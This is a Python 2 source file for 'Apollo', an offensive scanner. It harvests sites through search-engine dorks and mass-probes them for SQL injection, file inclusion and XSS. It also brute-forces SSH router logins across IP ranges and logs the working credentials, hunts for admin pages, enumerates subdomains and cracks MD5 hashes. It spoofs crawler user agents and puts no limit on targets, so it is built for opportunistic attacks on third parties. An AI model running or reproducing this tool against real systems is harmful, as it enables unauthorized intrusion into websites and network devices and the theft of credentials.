#!/usr/bin/env python
"""
      Apollo.py - Python Vulnerability Scanner V1 -
       Written by Sotd - twitter.com/#!/Sotd_
"""            

#For dorks don't include inurl: , Eg: Enter your dork: main.php?id=

import re
import hashlib
import Queue
from random import choice
import threading
import time
import urllib2
import sys
import socket

try:
    import paramiko     #Router option requires the paramiko module for shh connections.
    PARAMIKO_IMPORTED = True
except ImportError:
    PARAMIKO_IMPORTED = False



USER_AGENT = ["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3",
             "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
             "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
             "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
             "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
            ]
option = ' '
vuln = 0
invuln = 0
np = 0
found = []


class Router(threading.Thread):
    """Checks for routers running ssh with given User/Pass"""
    def __init__(self, queue, user, passw):
        if not PARAMIKO_IMPORTED:
            print 'You need paramiko.'
            print 'http://www.lag.net/paramiko/'
            sys.exit(1)
        threading.Thread.__init__(self)     
        self.queue = queue 
        self.user = user
        self.passw = passw
 
    def run(self):
        """Tries to connect to given Ip on port 22"""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        while True:
            try:
                ip_add = self.queue.get(False)

            except Queue.Empty:
                break
            try:
                ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)
                ssh.close()
                print "Working: %s:22 - %s:%s\n" % (ip_add, self.user, self.passw)
                write = open('Routers.txt', "a+")
                write.write('%s:22 %s:%s\n' % (ip_add, self.user, self.passw))
                write.close()  
            except:
                print 'Not Working: %s:22 - %s:%s\n' % (ip_add, self.user, self.passw)
                
            
class Ip:
    """Handles the Ip range creation"""
    def __init__(self):
        self.ip_range = []
        self.start_ip = raw_input('Start ip: ')
        self.end_ip = raw_input('End ip: ')
        self.user = raw_input('User: ')
        self.passw = raw_input('Password: ')
        self.iprange()
       
    def iprange(self):
        """Creates list of Ip's from Start_Ip to End_Ip"""
        queue = Queue.Queue()
        start = list(map(int, self.start_ip.split(".")))
        end = list(map(int, self.end_ip.split(".")))
        tmp = start
       
        self.ip_range.append(self.start_ip)
        while tmp != end:
            start[3] += 1
            for i in (3, 2, 1):
                if tmp[i] == 256:
                    tmp[i] = 0
                    tmp[i-1] += 1
            self.ip_range.append(".".join(map(str, tmp)))
       
        for add in self.ip_range:
            queue.put(add)

        for i in range(10):
            thread = Router(queue, self.user, self.passw )
            thread.setDaemon(True)
            thread.start() 
        queue.join()


class Crawl:
    """Searches for dorks and grabs results"""
    def __init__(self):
        self.dork = raw_input('Enter your dork: ')
        self.queue = Queue.Queue()
        self.pages = raw_input('How many pages(Max 20): ')
        self.qdork = urllib2.quote(self.dork)
        self.page = 1
        self.crawler()
   
    def crawler(self):
        """Crawls Ask.com for sites and sends them to appropriate scan"""
        print '\nScanning Ask...'
        for i in range(int(self.pages)):
            host = "http://uk.ask.com/web?q=%s&page=%s" % (str(self.qdork), self.page)
            req = urllib2.Request(host)
            req.add_header('User-Agent', choice(USER_AGENT))
            response = urllib2.urlopen(req)
            source = response.read()
            start = 0
            count = 1
            end = len(source)
            numlinks = source.count('_t" href', start, end)
 
            while count < numlinks:
                start = source.find('_t" href', start, end)
                end = source.find(' onmousedown="return pk', start,  end)
                link = source[start+10:end-1].replace("amp;","")
                self.queue.put(link)
                start = end
                end = len(source)
                count = count + 1 
            self.page += 1

        if option == '1':
            for i in range(10):
                thread = ScanClass(self.queue)
                thread.setDaemon(True)
                thread.start() 
            self.queue.join()

        elif option == '2':
            for i in range(10):
                thread = LScanClass(self.queue)
                thread.setDaemon(True)
                thread.start() 
            self.queue.join()

        elif option == '3':
            for i in range(10):
                thread = XScanClass(self.queue)
                thread.setDaemon(True)
                thread.start() 
            self.queue.join()

        elif option == '4':
            for i in range(10):
                thread = RScanClass(self.queue)
                thread.setDaemon(True)
                thread.start() 
            self.queue.join()

   
class ScanClass(threading.Thread):
    """Scans for Sql errors and ouputs to file"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
        self.schar = "'"
        self.file = 'Sqli.txt'
 
    def run(self):
        """Scans Url for Sql errors"""
        while True:
            try:
                site = self.queue.get(False)
            except Queue.Empty:
                break
            if '=' in site:
                global vuln
                global invuln
                global np
                test = site + self.schar

                try:
                    conn = urllib2.Request(test)
                    conn.add_header('User-Agent', choice(USER_AGENT))
                    opener = urllib2.build_opener()
                    data = opener.open(conn).read()
                except:
                    self.queue.task_done()
                else:
                    if (re.findall("You have an error in your SQL syntax", data, re.I)):
                        self.mysql(test)
                        vuln += 1
                    elif (re.findall('mysql_fetch', data, re.I)):
                        self.mysql(test)
                        vuln += 1
                    elif (re.findall('JET Database Engine', data, re.I)):
                        self.mssql(test)
                        vuln += 1
                    elif (re.findall('Microsoft OLE DB Provider for', data, re.I)):
                        self.mssql(test)
                        vuln += 1
                    else:
                        print test + ' <-- Not Vuln'
                        invuln += 1
            else:
                print site + ' <-- No Parameters'
                np += 1
            self.queue.task_done()


    def mysql(self, url):
        """Proccesses vuln sites into text file and outputs to screen"""
        read = open(self.file, "a+").read()
        if url in read:
            print 'Dupe: ' + url
        else:
            print "MySql: " + url
            write = open(self.file, "a+")
            write.write('[SQLI]: ' + url + "\n")
            write.close()

    def mssql(self, url):
        """Proccesses vuln sites into text file and outputs to screen"""
        read = open(self.file).read()
        if url in read:
            print 'Dupe: ' + url
        else:
            print "MsSql: " + url
            write = open ('[SQLI]: ' + self.file, "a+")
            write.write(url + "\n")
            write.close()   


class LScanClass(threading.Thread):
    """Scans for Lfi errors and outputs to file"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.file = 'Lfi.txt'
        self.queue = queue
        self.lchar = '../' 
       
    def run(self):
        """Checks Url for File Inclusion errors"""
        while True:
            try:
                site = self.queue.get(False)
            except Queue.Empty:
                break
            if '=' in site:
                lsite = site.rsplit('=', 1)[0]
                if lsite[-1] != "=":
                    lsite = lsite + "="
                test = lsite + self.lchar
                global vuln
                global invuln
                global np

                try:
                    conn = urllib2.Request(test)
                    conn.add_header('User-Agent', choice(USER_AGENT))
                    opener = urllib2.build_opener()
                    data = opener.open(conn).read()

                except:
                    self.queue.task_done()

                else:
                    if (re.findall("failed to open stream: No such file or directory", data, re.I)):
                        self.lfi(test)
                        vuln += 1
                    else:
                        print test + ' <-- Not Vuln'
                        invuln += 1
            else:
                print site + ' <-- No Parameters' 
                np += 1  
            self.queue.task_done()


    def lfi(self, url):
        """Proccesses vuln sites into text file and outputs to screen"""
        read = open(self.file, "a+").read()
        if url in read:
            print 'Dupe: ' + url
        else:
            print "Lfi: " + url
            write = open(self.file, "a+")
            write.write('[LFI]: ' + url + "\n")
            write.close()      


class XScanClass(threading.Thread):
    """Scan for Xss errors and outputs to file"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
        self.xchar = """"><script>alert('xss')</script>"""
        self.file = 'Xss.txt'
 
    def run(self):
        """Checks Url for possible Xss"""
        while True:
            try:
                site = self.queue.get(False)
            except Queue.Empty:
                break
            if '=' in site:
                global vuln
                global invuln
                global np
                xsite = site.rsplit('=', 1)[0]
                if xsite[-1] != "=":
                    xsite = xsite + "="
                test = xsite + self.xchar
                try:
                    conn = urllib2.Request(test)
                    conn.add_header('User-Agent', choice(USER_AGENT))
                    opener = urllib2.build_opener()
                    data = opener.open(conn).read()
                except:
                    self.queue.task_done()
                else:
                    if (re.findall("<script>alert('xss')</script>", data, re.I)):
                        self.xss(test)
                        vuln += 1
                    else:
                        print test + ' <-- Not Vuln'
                        invuln += 1
            else:
                print site + ' <-- No Parameters'
                np += 1
            self.queue.task_done()
 
    def xss(self, url):
        """Proccesses vuln sites into text file and outputs to screen"""
        read = open(self.file, "a+").read()
        if url in read:
            print 'Dupe: ' + url
        else:
            print "Xss: " + url
            write = open(self.file, "a+")
            write.write('[XSS]: ' + url + "\n")
            write.close()   


class RScanClass(threading.Thread):
    """Scans for Rfi errors and outputs to file"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
        self.file = 'Rfi.txt'
 
    def run(self):
        """Checks Url for Remote File Inclusion vulnerability"""
        while True:
            try:
                site = self.queue.get(False)
            except Queue.Empty:
                break
            if '=' in site:
                global vuln
                global invuln
                global np
                rsite = site.rsplit('=', 1)[0]
                if rsite[-1] != "=":
                    rsite = rsite + "="
                link = rsite + 'http://google.com' + '?'
                try:
                    conn = urllib2.Request(link)
                    conn.add_header('User-Agent', choice(USER_AGENT))
                    opener = urllib2.build_opener()
                    data = opener.open(conn).read()
                except:
                    self.queue.task_done()
                else:
                    if (re.findall("""<meta content="Search the world's information, including webpages, images, videos and more.""", data, re.I)): 
                        self.rfi(link)
                        vuln += 1
                    else:
                        print link  + ' <-- Not Vuln'
                        invuln += 1
            else:
                print site + ' <-- No Parameters'
                np += 1        
            self.queue.task_done()
   
    def rfi(self, url):
        """Proccesses vuln sites into text file and outputs to screen"""
        read = open(self.file, "a+").read()
        if url in read:
            print 'Dupe: ' + url
        else:
            print "Rfi: " + url
            write = open(self.file, "a+")
            write.write('[Rfi]: ' + url + "\n")
            write.close()       

 
class Atest(threading.Thread):
    """Checks given site for Admin Pages/Dirs"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
 
    def run(self):
        """Checks if Admin Page/Dir exists"""
        while True:
            try:
                site = self.queue.get(False)

            except Queue.Empty:
                break
            try:
                conn = urllib2.Request(site)
                conn.add_header('User-Agent', choice(USER_AGENT))
                opener = urllib2.build_opener()
                opener.open(conn)
                print site
                found.append(site)
                self.queue.task_done()
   
            except urllib2.URLError:
                self.queue.task_done()


def admin():
    """Create queue and threads for admin page scans"""
    print 'Need to include http:// and ending /\n'
    site = raw_input('Site: ')
    queue  = Queue.Queue()
    dirs = ['admin.php', 'admin/', 'en/admin/', 'administrator/', 'moderator/', 'webadmin/', 'adminarea/', 'bb-admin/', 'adminLogin/', 'admin_area/', 'panel-administracion/', 'instadmin/', 
            'memberadmin/', 'administratorlogin/', 'adm/', 'admin/account.php', 'admin/index.php', 'admin/login.php', 'admin/admin.php', 'admin/account.php', 
            'joomla/administrator', 'login.php', 'admin_area/admin.php' ,'admin_area/login.php' ,'siteadmin/login.php' ,'siteadmin/index.php', 'siteadmin/login.html', 
            'admin/account.html', 'admin/index.html', 'admin/login.html', 'admin/admin.html', 'admin_area/index.php', 'bb-admin/index.php', 'bb-admin/login.php', 
            'bb-admin/admin.php', 'admin/home.php', 'admin_area/login.html', 'admin_area/index.html', 'admin/controlpanel.php', 'admincp/index.asp', 'admincp/login.asp', 
            'admincp/index.html', 'admin/account.html', 'adminpanel.html', 'webadmin.html', 'webadmin/index.html', 'webadmin/admin.html', 'webadmin/login.html', 
            'admin/admin_login.html', 'admin_login.html', 'panel-administracion/login.html', 'admin/cp.php', 'cp.php', 'administrator/index.php', 'cms', 'administrator/login.php',
            'nsw/admin/login.php', 'webadmin/login.php', 'admin/admin_login.php', 'admin_login.php', 'administrator/account.php' ,'administrator.php', 'admin_area/admin.html',
            'pages/admin/admin-login.php' ,'admin/admin-login.php', 'admin-login.php', 'bb-admin/index.html', 'bb-admin/login.html', 'bb-admin/admin.html', 'admin/home.html',
            'modelsearch/login.php', 'moderator.php', 'moderator/login.php', 'moderator/admin.php', 'account.php', 'pages/admin/admin-login.html', 'admin/admin-login.html',
            'admin-login.html', 'controlpanel.php', 'admincontrol.php', 'admin/adminLogin.html' ,'adminLogin.html', 'admin/adminLogin.html', 'home.html',
            'rcjakar/admin/login.php', 'adminarea/index.html', 'adminarea/admin.html', 'webadmin.php', 'webadmin/index.php', 'webadmin/admin.php', 'admin/controlpanel.html',
            'admin.html', 'admin/cp.html', 'cp.html', 'adminpanel.php', 'moderator.html', 'administrator/index.html', 'administrator/login.html', 'user.html',
            'administrator/account.html', 'administrator.html', 'login.html', 'modelsearch/login.html', 'moderator/login.html', 'adminarea/login.html',
            'panel-administracion/index.html', 'panel-administracion/admin.html', 'modelsearch/index.html', 'modelsearch/admin.html', 'admincontrol/login.html',
            'adm/index.html', 'adm.html', 'moderator/admin.html', 'user.php', 'account.html', 'controlpanel.html', 'admincontrol.html', 'panel-administracion/login.php',
            'wp-login.php', 'wp-admin', 'typo3', 'adminLogin.php', 'admin/adminLogin.php', 'home.php','adminarea/index.php' ,'adminarea/admin.php' ,'adminarea/login.php',
            'panel-administracion/index.php', 'panel-administracion/admin.php', 'modelsearch/index.php', 'modelsearch/admin.php', 'admincontrol/login.php',
            'adm/admloginuser.php', 'admloginuser.php', 'admin2.php', 'admin2/login.php', 'admin2/index.php', 'adm/index.php', 'adm.php', 'affiliate.php']
    
    for add in dirs:
        test = site + add
        queue.put(test)
        
    for i in range(20):
        thread = Atest(queue)
        thread.setDaemon(True)
        thread.start() 
    queue.join()

def aprint():
    """Print results of admin page scans"""
    print 'Search Finished\n'
    if len(found) == 0:
        print 'No pages found'
    else:
        for site in found:
            print 'Found: ' + site

       
class SDtest(threading.Thread):
    """Checks given Domain for Sub Domains"""
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
 
    def run(self):
        """Checks if Sub Domain responds"""
        while True:
            try:
                domain = self.queue.get(False)
            except Queue.Empty:
                break
            try:
                site = 'http://' + domain
                conn = urllib2.Request(site)
                conn.add_header('User-Agent', choice(USER_AGENT))
                opener = urllib2.build_opener()
                opener.open(conn)
            except urllib2.URLError:
                self.queue.task_done()
            else:
                target = socket.gethostbyname(domain)  
                print 'Found: ' + site + ' - ' + target
                self.queue.task_done()        
 

def subd():
    """Create queue and threads for sub domain scans"""
    queue = Queue.Queue()
    site = raw_input('Domain: ')
    sub = ["admin", "access", "accounting", "accounts", "admin", "administrator", "aix", "ap", "archivos", "aula", "aulas", "ayuda", "backup", "backups", "bart", "bd", "beta", "biblioteca",
            "billing", "blackboard", "blog", "blogs", "bsd", "cart", "catalog", "catalogo", "catalogue", "chat", "chimera", "citrix", "classroom", "clientes", "clients", "carro",
            "connect", "controller", "correoweb", "cpanel", "csg", "customers", "db", "dbs", "demo", "demon", "demostration", "descargas", "developers", "development", "diana",
            "directory", "dmz", "domain", "domaincontroller", "download", "downloads", "ds", "eaccess", "ejemplo", "ejemplos", "email", "enrutador", "example", "examples", "exchange",
            "eventos", "events", "extranet", "files", "finance", "firewall", "foro", "foros", "forum", "forums", "ftp", "ftpd", "fw", "galeria", "gallery", "gateway", "gilford",
            "groups", "groupwise", "guia", "guide", "gw", "help", "helpdesk", "hera", "heracles", "hercules", "home", "homer", "hotspot", "hypernova", "images", "imap", "imap3", "imap3d",
            "imapd", "imaps", "imgs", "imogen", "inmuebles", "internal", "intranet", "ipsec", "irc", "ircd", "jabber", "laboratorio", "lab", "laboratories", "labs", "library", "linux", "lisa",  "login", "logs", "mail", "mailgate", "manager", "marketing", "members", "mercury", "meta", "meta01", "meta02", "meta03", "miembros", "minerva", "mob", "mobile", "moodle", "movil",
            "mssql", "mx", "mx0", "mx1", "mx2", "mx3", "mysql", "nelson", "neon", "netmail", "news", "novell", "ns", "ns0", "ns1", "ns2", "ns3", "online", "oracle", "owa", "partners", "pcanywhere",
            "pegasus", "pendrell", "personal", "photo", "photos", "pop", "pop3", "portal", "postman", "postmaster", "private", "proxy", "prueba", "pruebas", "public", "ras", "remote", "reports", "research",
            "restricted", "robinhood", "router", "rtr", "sales", "sample", "samples", "sandbox", "search", "secure", "seguro", "server", "services", "servicios", "servidor", "shop", "shopping",
            "smtp", "socios", "soporte", "squirrel", "squirrelmail", "ssh", "staff", "sms", "solaris", "sql", "stats", "sun", "support", "test", "tftp", "tienda", "unix", "upload", "uploads",
            "ventas", "virtual", "vista", "vnc", "vpn", "vpn1", "vpn2", "vpn3", "wap", "web1", "web2", "web3", "webct", "webadmin", "webmail", "webmaster", "win", "windows", "www", "ww0", "ww1",
            "ww2", "ww3", "www0", "www1", "www2", "www3", "xanthus", "zeus"]

    for check in sub:
        test = check + '.' + site
        queue.put(test)
        
    for i in range(20):
        thread = SDtest(queue)
        thread.setDaemon(True)
        thread.start() 
    queue.join()


class Cracker(threading.Thread):
    """Use a wordlist to try and brute the hash"""
    def __init__(self, queue, hashm):
        threading.Thread.__init__(self)
        self.queue = queue
        self.hashm = hashm

    def run(self): 
        """Hash word and check against hash"""
        while True:
            try:
                word = self.queue.get(False)
            except Queue.Empty:
                break
            tmp = hashlib.md5(word).hexdigest()
            if tmp == self.hashm:
                self.result(word)   
            self.queue.task_done() 

    def result(self, words):
        """Print result if found"""
        print self.hashm + ' = ' + words

def word():
    """Create queue and threads for hash crack"""
    queue = Queue.Queue()
    wordlist = raw_input('Wordlist: ')
    hashm = raw_input('Enter Md5 hash: ')
    read = open(wordlist)
    for words in read:
        words = words.replace("\n","")
        queue.put(words)       
    read.close()
    for i in range(5):
        thread = Cracker(queue, hashm)
        thread.setDaemon(True)
        thread.start()
    queue.join()


class OnlineCrack:
    """Use online service to check for hash"""

    def crack(self):
        """Connect and check hash"""
        hashm = raw_input('Enter MD5 Hash: ')
        conn = urllib2.Request('http://md5.hashcracking.com/search.php?md5=%s' % (hashm))
        conn.add_header('User-Agent', choice(USER_AGENT))
        opener = urllib2.build_opener()
        opener.open(conn)
        data = opener.open(conn).read()
        if data == 'No results returned.':
            print '\n- Not found or not valid -'
        else:
            print '\n- %s -' % (data)


class Check:
    """Check your current IP address"""

    def grab(self):
        """Connect to site and grab IP"""
        site = 'http://www.tracemyip.org/'
        try:
            conn = urllib2.Request(site)
            conn.add_header('User-Agent', choice(USER_AGENT))
            opener = urllib2.build_opener()
            opener.open(conn)
            data = opener.open(conn).read()  
            start = 0
            end = len(data)     
            start = data.find('onClick="', start, end)
            end = data.find('size=', start, end)   
            ip_add = data[start+46:end-2].strip()
            print '\nYour current Ip address is %s' % (ip_add)
        
        except urllib2.HTTPError:
            print 'Error connecting'
    

def output():
    """Outputs dork scan results to screen"""
    print '\n>> ' + str(vuln) + ' Vulnerable Sites Found'
    print '>> ' + str(invuln) + ' Sites Not Vulnerable'
    print '>> ' + str(np) + ' Sites Without Parameters'
    if option == '1':
        print '>> Output Saved To Sqli.txt\n'
    elif option == '2':
        print '>> Output Saved To Lfi.txt'
    elif option == '3':
        print '>> Output Saved To Xss.txt'
    elif option == '4':
        print '>> Output Saved To Rfi.txt'  


def main():
    """Outputs Menu and gets input"""
    red = "\033[01;31m{0}\033[00m"
    quotes = [
         '\n"Three things cannot be long hidden: the sun, the moon, and the truth."\n', 
         '\n"Nothing holds it together except an idea which is indestructible"\n', 
         '\n"I am not a liberator. Liberators do not exist. The people liberate themselves."\n', 
         '\n"Heresy is just another word for freedom of thought".\n', 
         '\n"The tragedy of modern war is that the young men die fighting each other - instead of their real enemies back home in the capitals"\n', 
         '\n"A man is no less a slave because he is allowed to choose a new master once in a term of years."\n'
        ]
    print red.format('''
            _____       _       _
           /  ___|     | |     | |
           \ `--.  ___ | |_  __| |
            `--. \/ _ \| __|/ _` |
           /\__/ / (_) | |_  (_| |
           \____/ \___/ \__|\__,_|
                     
#################################################
#                                    |          #
#                                  \ _ /        #
#           Welcome to Apollo    -= (_) =-      #                           
#Options:                          /   \        #
#[1] Sqli                            |          #
#[2] Lfi                                        #
#[3] Xss                                        #
#[4] Rfi                                        #
#[5] Routers                                    #
#[6] Admin Page Finder                          #
#[7] Sub Domain Scan                            #
#[8] Dictionary MD5 cracker                     #
#[9] Online MD5 cracker                         #
#[10] Check IP                                  #
#################################################
''')
    global option
    option = raw_input('Enter Option: ')
 
    if option:
        if option == '1':
            Crawl()
            output()
            print red.format(choice(quotes))
            
        elif option == '2':
            Crawl()
            output()
            print red.format(choice(quotes))
 
        elif option == '3':
            Crawl()
            output()
            print red.format(choice(quotes))
 
        elif option == '4':
            Crawl()
            output()
            print red.format(choice(quotes))
     
        elif option == '5':
            Ip()
            print red.format(choice(quotes))
 
        elif option == '6':
            admin()
            aprint()
            print red.format(choice(quotes))

        elif option == '7':
            subd()
            print red.format(choice(quotes))

        elif option == '8':
            word()
            print red.format(choice(quotes))  

        elif option == '9':
            OnlineCrack().crack()
            print red.format(choice(quotes)) 
                  

        elif option == '10':
            Check().grab()  
            print red.format(choice(quotes))       

        else:
            print '\nInvalid Choice\n'
            time.sleep(0.5)
            main()    
 
    else:
        print '\nYou Must Enter An Option\n'
        time.sleep(0.5)
        main()
 
 
if __name__ == '__main__':
    main()


